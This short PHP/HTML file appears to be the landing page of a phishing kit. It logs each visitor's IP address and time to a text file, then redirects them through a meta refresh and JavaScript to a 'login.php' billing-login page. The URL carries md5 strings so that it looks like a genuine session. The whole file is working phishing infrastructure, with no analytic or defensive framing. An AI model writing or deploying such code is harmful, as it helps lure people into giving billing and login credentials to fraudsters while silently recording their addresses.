<?
$md5 = md5(uniqid(time()));
$ip = getenv("REMOTE_ADDR");
$file = fopen("visits.txt","a");
fwrite($file, $ip."  -  ".gmdate ("Y-n-d")." ---> ".gmdate ("H:i:s")."\n");

$index="login.php?action=billing_login=true&_session;".md5(time()).md5(time());



?>
<html><head>
<META HTTP-EQUIV="Refresh" CONTENT="0;URL=<?echo $index; ?>">

<script type="text/javascript">
echo = "<?echo $index; ?>"
self.location.replace(echo);
window.location = echo;
</script>
</head>